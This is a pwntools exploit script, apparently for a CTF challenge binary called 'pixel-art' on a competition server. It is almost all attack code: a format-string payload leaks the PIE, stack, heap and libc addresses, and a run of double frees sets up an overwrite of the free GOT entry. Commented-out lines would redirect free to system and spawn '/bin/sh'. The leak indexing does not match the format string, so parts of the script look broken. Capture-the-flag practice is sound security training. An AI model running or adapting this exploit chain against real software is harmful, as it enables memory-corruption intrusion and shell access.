#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./pixel-art')
host = args.HOST or 'server.challenge.ctf.thefewchosen.com'
port = int(args.PORT or 1344)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def cmd(option):
    sla(b"0. Exit\n", str(option))

def set_width_height(width=50, height=50):
    sla(b'Width of image: ', str(width))
    sla(b'Height of image: ', str(height))

def add_pixel(row, col, pixel_size, pixel):
    cmd(1)
    sla(b"row> ", str(row))
    sla(b"column> ", str(col))
    sla(b"pattern length> ", str(pixel_size))
    sla(b"pattern> ", pixel)

def delete_pixel(row, col):
    cmd(2)
    sla(b"row> ", str(row))
    sla(b"column> ", str(col))

def edit_pixel(row, col, pixel):
    cmd(3)
    sla(b"row> ", str(row))
    sla(b"column> ", str(col))
    sla(b"pattern> ", pixel)

libc=ELF("bkup/libc.so.6")
io = start()

set_width_height()
# %17$p -> exe %16$p -> stack %15%p -> heap  %25$p libc
# add_pixel(0, 0, 50, b"%29$p||%30$p|%31$p|%32$p|%33$p||%34$p|%35$p" )
add_pixel(0, 0, 50, b"%17$p||%16$p|%15$p|%25$p" )
cmd(4)
leak=rl().strip(b"\n").split(b"|")
exe.address = int(leak[0], 16)-0x1b39
stack = int(leak[2], 16)
heap_base = int(leak[3], 16)-0x1438
libc.address = int(leak[4], 16)-0x270b3
success(f"PIE base : {hex(exe.address)}")
success(f"stack : {hex(stack)}")
success(f"heap base : {hex(heap_base)}")
success(f"Libc base : {hex(libc.address)}")
success(f"__free_hook : {hex(libc.sym['__free_hook'])}")
add_pixel(1, 1, 50, b"A"*8 + p(exe.got.free) )
add_pixel(2, 2, 50, b"B"*8 + p(exe.got.free) )
add_pixel(3, 3, 50, b"C"*8 + p(exe.got.free) )
delete_pixel(1, 1)
delete_pixel(2, 2)
add_pixel(1, 1, 50, b'L'*8 + p(0x0)+p(0x30) + p(exe.got.free))
delete_pixel(2, 2)
delete_pixel(3, 3)
edit_pixel(1, 1, b"\xff")
add_pixel(4, 4, 0x10, b'L'*8 + p(exe.got.free)) # len is taken from here
delete_pixel(4, 4)
delete_pixel(4, 4)
# edit_pixel(1, 1, p(libc.sym.system))
# add_pixel(10, 10, 32,  b"/bin/sh;")
# delete_pixel(10, 10)
io.interactive()
